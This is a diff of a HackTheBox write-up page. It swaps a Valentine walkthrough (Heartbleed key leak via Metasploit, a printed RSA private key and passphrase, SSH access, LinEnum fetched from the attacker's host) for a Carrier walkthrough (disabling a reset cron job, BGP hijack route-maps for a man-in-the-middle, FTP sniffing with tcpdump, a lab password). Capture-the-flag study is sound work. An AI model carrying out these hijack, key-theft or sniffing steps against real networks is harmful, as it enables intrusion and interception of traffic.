@@ -6,7 +6,7 @@
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 <meta name="revised" content="2019-03-19T10:34:51 EDT">
-<title>Valentine :: DocDock Documentation</title>
+<title>Carrier :: DocDock Documentation</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
 <link href="/css/nucleus.css" rel="stylesheet">
@@ -25,7 +25,7 @@
 
     
   </head>
-  <body data-url="/hackthebox/boxes/valentine/">
+  <body data-url="/hackthebox/boxes/carrier-root/">
     
       <header>
   <div class="logo">
@@ -149,7 +149,7 @@
         <a href="/hackthebox/boxes/blue/">Blue</a><i class="fa fa-circle-thin read-icon"></i>
     </div>
 </li>
-<li data-nav-id="/hackthebox/boxes/carrier-root/" class="dd-item">
+<li data-nav-id="/hackthebox/boxes/carrier-root/" class="dd-item active">
     <div>
         <a href="/hackthebox/boxes/carrier-root/">
             Carrier
@@ -212,7 +212,7 @@
         <a href="/hackthebox/boxes/secnotes/">SecNotes</a><i class="fa fa-circle-thin read-icon"></i>
     </div>
 </li>
-<li data-nav-id="/hackthebox/boxes/valentine/" class="dd-item parent active
+<li data-nav-id="/hackthebox/boxes/valentine/" class="dd-item
         ">
     <div>
 
@@ -457,7 +457,7 @@
     <option value="/hackthebox/boxes/blue/" >
   -- 
    Blue</option>
-      <option value="/hackthebox/boxes/carrier-root/" >-- Carrier</option>
+      <option value="/hackthebox/boxes/carrier-root/"  selected>-- Carrier</option>
       <option value="/hackthebox/boxes/carrier/" >-- Carrier</option>
     <option value="/hackthebox/boxes/crimestoppers/" >
   -- 
@@ -476,10 +476,9 @@
     <option value="/hackthebox/boxes/secnotes/" >
   -- 
    SecNotes</option>
-    <option value="/hackthebox/boxes/valentine/"  selected>
+    <option value="/hackthebox/boxes/valentine/" >
   -- 
-   Valentine</option> 
-  
+   Valentine</option>
     <option value="/hackthebox/boxes/waldo/" >
   -- 
    Waldo</option>
@@ -526,187 +525,84 @@
       </div>
     
 
-    <h1>Valentine</h1>
+    <h1>Carrier</h1>
     
     
     
+    <p>This guide will only cover setting up bgp high jacking and to better summarize how to setup a mitm using bgp. There is one method that i believe everyone used which is where you host a ftp server and just redirect the track to your server. Not quite as cool as the mitm.</p>
 
-<p>I lost my original notes. VM corrupted.</p>
+<p>Theres a script running in the background that will reset all the changes made. I had to deal with this the whole time i did the lab. I never once tried to disable it. Next time i have a cron job running the background thats hindering me in someway ill use this.</p>
 
-<p>PHASE 1 — NMAP</p>
-
-<pre><code>nmap -sC -sV -Pn -oA initial 10.10.10.79
+<pre><code>reading 		crontab -l | grep -v &quot;^#&quot;
+disable 		chmod -x /opt/restore.sh
 </code></pre>
 
-<p>Didn’t  return anything of significance. https is odd for a hackthebox  challenge. Port 22 could be the initial foothold. Google apache 2.2.22  https vulns nothing crazy pops out.</p>
+<p>I used telnet to connect the router and perform my administrator. 0xdf used vtysh free range routing software suit for managing background protocols.</p>
 
-<p><img src="https://cdn-images-1.medium.com/max/667/1*ktA4Uly8qZqyY5idaFSzIQ.png" alt="img" /></p>
+<p><img src="https://chickenpwny.github.io/images/carrier-rootvtysh.PNG" alt="vtysh" /></p>
 
-<p>PHASE 2 — GOBUSTER /wpscan</p>
+<p>overview</p>
 
-<pre><code>gobuster -u [http://10.10.10.](http://10.10.10.88)79 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-mediuml.txt -t 50
+<p>permit   basically the order in which route-maps are checked in. highest to lowest, once all of the  controls of been checked it will break out if none are met.</p>
+
+<p>prefix-list  I missed this part in my attempts ip prefix-list a set of conditions to check routes against either deny or allow. my understanding of this is that well be targeting 10.120.15.0 network sinve the network is using /24 /25. If you have two router advertisng two different subnets which everone has the closest match will have priority. example would be 10.120.0.0/16, the host2 10.120.15.0./24 would be prefered.</p>
+
+<p>route-map to-as200 effects that autonomous system</p>
+
+<pre><code>configure terminal
+this advertise a route to 10.120.15.0
+ip prefix-list chicken permit 10.120.15.0/25
+this tells as200 not to advertise it's route to as300. this is pretty important.
+route-map to-as200 permit 10
+match ip address prefix-list chicken
+set community no-export
+nothing will hapen to routes that don't match 10.120.15.0/25
+route-map to-as200 permit 20
+deny unless it patches the prefix-list
+route-map to-as300 deny 10
+match ip address prefix-list chicken
+
+route-map to-as300 permit 20
+
+router bgp 100
+network 10.120.15.0 mask 255.255.255.128
 </code></pre>
 
-<p><img src="https://cdn-images-1.medium.com/max/667/1*6GxlmGhzKcW9p3dM6IJQmA.png" alt="img" /></p>
+<pre><code>configure terminal
 
-<p>return vulnerable to OpenSSL hearbleed</p>
+ip prefix-list chicken permit 10.120.15.0/25
 
-<p>PHASE 3 Manual investigation of the webpage</p>
+route-map to-as200 permit 10
+match ip address prefix-list chicken
+set community no-export
 
-<p><img src="https://cdn-images-1.medium.com/max/667/1*qKs0pc3NjJSekozsOxl5aQ.png" alt="img" /></p>
+route-map to-as200 permit 20
 
-<p>The big give away. A heart bleeding, hmm.</p>
+route-map to-as300 deny 10
+match ip address prefix-list chicken
 
-<p><img src="https://cdn-images-1.medium.com/max/667/1*6q_Tt4SUGxpXiLjP3Hawfg.png" alt="img" /></p>
+route-map to-as300 permit 20
 
-<p>BELIEVE THE HYPE. It’s also a hint to the exploit.</p>
-
-<p>PHASE 4</p>
-
-<p>Wpscan returned Heartbleed vulnerability.</p>
-
-<p><img src="https://cdn-images-1.medium.com/max/667/1*egW7vA0TIGqAoOhPc0ZScg.png" alt="img" /></p>
-
-<p>You may also run the exploit through Metasploit.</p>
-
-<p><img src="https://cdn-images-1.medium.com/max/667/1*Rsm41I0bgJ06JiW29nyVsw.png" alt="img" /></p>
-
-<p>msfconsole</p>
-
-<pre><code>search bleed
-
-use auxiliary/scanner/ssl/openssl_heartbleed 
-
-set RHOSTS 10.10.10.79
-
-set ACTION KEYS
-
-exploit
+router bgp 100
+network 10.120.15.0 mask 255.255.255.128
 </code></pre>
 
-<pre><code>-----BEGIN RSA PRIVATE KEY-----
-MIIEpQIBAAKCAQEAwygXrPgZKkHSij/OeRwZ9PtI+tMvM2tvyJz5o78ZZqihjfki
-Yg7hnkVQH1kvrLqVz68jqlTJZEAPJajF3cvEHIcM0nMSLnd2z4lI+zlK4fU9QMO1
-moJo9o2Msk0/TwMJwLqtdF1TZLBXakQPH7f2+wWIrrLByt6m+8Vmd0YpdWDQr5Hd
-WTA6C4+FIeVdyCIcVup6Lw0nXOKn1i5VRheHItUbZmIlhfoJHDhtGxSeqXrgMU1D
-Js6wkebQm0jYz095+a8SRNRl5P93R1aFTTvprdtN6y0pl/hampnDrRcabHOkBB/l
-1Y6ox6YgrorgULjxstJI3n2ziQ226G3Ho4JelwIDAQABAoIBAQCWkqd5wE6CSRjt
-q/9deC4a04riY/CmJr2vtlXyXi52A6Pqi49YwwyW9fm0xjY/ehK+k+3brOFZ5QcK
-0mYgE+iy7gwZj8k2atwTkmPp2bGKF5J0FsxWc0oS+PHWXD19c+Wheyb7gkomhNxd
-VDerDGCWGxXzXF6jbRi/ZvYBDvRL59YOvXmdQa3MKykGywUn+NFZvUxICyEma24K
-5ABMIWm5cTmDzm5Cd5/wn5Pu4tY0TIzfoa3KnA+M8vpmd4xgRGWGpatFKrM3LqSq
-W0+Rr81Ty/R7lr1DkLDKp1ltvCl3pp1Lkoo3Ublk38C6gHHS3Vfs6h+QJfNgjeQu
-RyKqm3H5AoGBAPFMTE9WpalFjB0u+hHNbFRfRet8480wa5702AEDK/cHi0U+R9Z0
-Va/qm7PtzBP/m4nUXJwZbvG9O2PKXusGmgIBc/jqSQpQriIvBb27AJiq65Jd7tJ4
-AiNZm6v/bFChFmWhdZe1S4vBgnlYoRWHsu+3JJpMJFKZYYl9O/X8ZWdtAoGBAM8M
-F8KO2EtVQUrosnZQfn+2pLbY4n4Q66N3QaBeoqY7UipBJ1r3jIfupiw5+M1gEXvB
-gnQmRLwRAA7Wmsh0/eCxeOk7kgNr7W8nNdxwp0Uv06h1CtEqvFIuXab5pYG5/QKs
-habSXxY02QuaVgM/vXBTSOO0TC/7Rm6ORJzAxAeTAoGBAOakinBvnwuMmaAvjgJE
-O57uLlQoXUp9VPFskaduE7EdOecm393B90GeW9QBoccf1NlK7naa7OwOd90ry8yU
-09LE9shfkQ9WDQxJrBAt1iUXgvK17Jiq80g818rw6+SqBVGBongvZ5WfkwpQSDDf
-M49knI0L6NA3If8cgJrg9UCFAoGBAK1DJmL23MP13UTNhAKEi8deVWp6BteOW1KZ
-Cr8kUqIfRDv99+wk+mIKcN7TyIQ9H4RbxEpkd+KVq2G/bxnO5WFxwogTBLZ+S9xX
-iLgnQaMhSdNP1rSBOcTf7hk8EqeDt9nT+6hFpbLUmMkf51iir2nfGEEM8TC56w+7
-WGmA2sqnAoGAUyztn0Sc08xny1oGQXjVcVy/KsszYNfaF2y4i6tsbDsD2HfzRvbp
-zeSeXxopyjjMTKCIMONh88JFeJoctmsLg2eG3uFw5c+wvD+GBafFfufvf2Xz183h
-05q+RVlBncSiUayk33RtWi0Csl9L3prrGKh9RLUBmkSZ/E90ATxE92w=
------END RSA PRIVATE KEY-----
+<p>tcpdump</p>
+
+<pre><code>tcpdump -i eth2 -nnXSs 0 'port 21' -w out.pcap 
 </code></pre>
 
-<p>Buahahahahaha, we have the ssh RSA key. Truly we are master of the universe.</p>
+<p><img src="../../../../../../Users/charl/OneDrive/Pictures/hackthebox/carrier-root/bgp.PNG" alt="bgp" /></p>
 
-<p><img src="https://cdn-images-1.medium.com/max/667/1*cUKOc1S3P8HDrfSV7RvGjQ.png" alt="-img" /></p>
-
-<p>without Metasploit; some crap the server leaked.</p>
-
-<p>PHASE 6 SSH</p>
-
-<p>Since we have the private keys and the ssh server has the public key all we need is the username. Based on the webpage hints my guess was it was</p>
-
-<div class="alert 
-alert-success"
- 
-role="alert"><p>hype</p>
-</div>
-
-
-<p>create a file named private-key &amp; change the permissions to 600.</p>
-
-<pre><code>vi private-key
-
-    in vim tpye     :set paste  then paste crlt-v
-
-chmod 600 private-key
-
-ssh -i private-key hype@valentine.htb
-</code></pre>
-
-<p>Snap we will need the passphrase for for the private key.</p>
-
-<p>go back to msfconsole and change the action to dump. Note you might need to repeat this a couple of times to find base64 encoded string.</p>
-
-<pre><code>set action DUMP
-</code></pre>
-
-<p><img src="https://chickenpwny.github.io/images/1545658274009.png" alt="1545658274009" /></p>
-
-<p>Metasploit stores the data in .msf4/loot/somefile</p>
-
-<p><img src="https://chickenpwny.github.io/images/valentine/metasploit_dump.PNG" alt="metasploit_dump" /></p>
-
-<pre><code>echo &quot;aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==&quot; &gt; string.b64
-
-base64 -d strting.b64
-
-heartbleedbelievethehype
-</code></pre>
-
-<p>ssh -i private-key hype@10.10.10.79</p>
-
-<p>passphrase = heartbleedbelievethehype</p>
-
-<div class="alert 
-alert-danger"
- 
-role="alert"><p>Hmm the key I found with metasploit doens&rsquo;t work but there is a private-key, I found earlier. repeat the steps from earlier and use the passphrase from the Metasploit memory dump .</p>
-</div>
-
-
-<p>We’re inside lets transfer over LinEnum. LinEnum is a script that automates enumerating the system. Python server is a neat way to move files around between systems.</p>
-
-<p><a href="https://github.com/rebootuser/LinEnum.git">https://github.com/rebootuser/LinEnum.git</a></p>
-
-<pre><code>HOSTING FILES
-go to directory where desired file is run command below, it will host the directory
-python3 -m http.server 8081
-go to browser http://localhost:[port]/[DirectoryName]
-note: i had to clear the firefox cache
-wget http://10.10.14.7:4488/home/
-</code></pre>
-
-<p><img src="https://cdn-images-1.medium.com/max/1000/1*wRStth3LHtYDoM0_CAdPcQ.png" alt="img" /></p>
-
-<p>haha that’s it folks</p>
-
-<p>A few lessons can be learned from this box beside updating the web server. Make sure system tools are properly secured. Make sure no level users can access bash-history. Be careful using setuid.</p>
-
-<p>Tmux isn’t always vulnerable but it can be when we can link it to a file/folder with the need permissions. Tmux has the ability to link its self to a file or folders group permissions. Ill talk about file permissions later. what a suid binary is.</p>
-
-<p>note : watch ippsec video on the box</p>
-
-<p>A better way to scan for vulns:</p>
-
-<pre><code>nmap -sV -p 445 — script safe -Pn -n -oA NmapScripts 10.10.10.97
-</code></pre>
-
+<p>Passwords BGPtelc0routing</p>
 
 
     
     
         <div class="chevrons">
     <div id="navigation">
-<a class="nav nav-prev" href="/hackthebox/boxes/secnotes/" title="SecNotes"> <i class="fa fa-chevron-left"></i><label>SecNotes</label></a>
-    <a class="nav nav-next" href="/hackthebox/boxes/waldo/" title="Waldo" style="margin-right: 0px;"><label>Waldo</label><i class="fa fa-chevron-right"></i></a></div>
+<a class="nav nav-prev" href="/hackthebox/boxes/blue/" title="Blue"> <i class="fa fa-chevron-left"></i><label>Blue</label></a>
+    <a class="nav nav-next" href="/hackthebox/boxes/carrier/" title="Carrier" style="margin-right: 0px;"><label>Carrier</label><i class="fa fa-chevron-right"></i></a></div>
   </div>
 
   </section>
@@ -723,7 +619,7 @@ wget http://10.10.14.7:4488/home/
 
     
     <div class="github-link">
-      <a href="https://chickenpwny.github.ioHackTheBox/Boxes/valentine/_index.md" target="blank"><i class="fa fa-code-fork"></i>
+      <a href="https://chickenpwny.github.ioHackTheBox/Boxes/Carrier-root.md" target="blank"><i class="fa fa-code-fork"></i>
         Improve this page</a>
     </div>
     
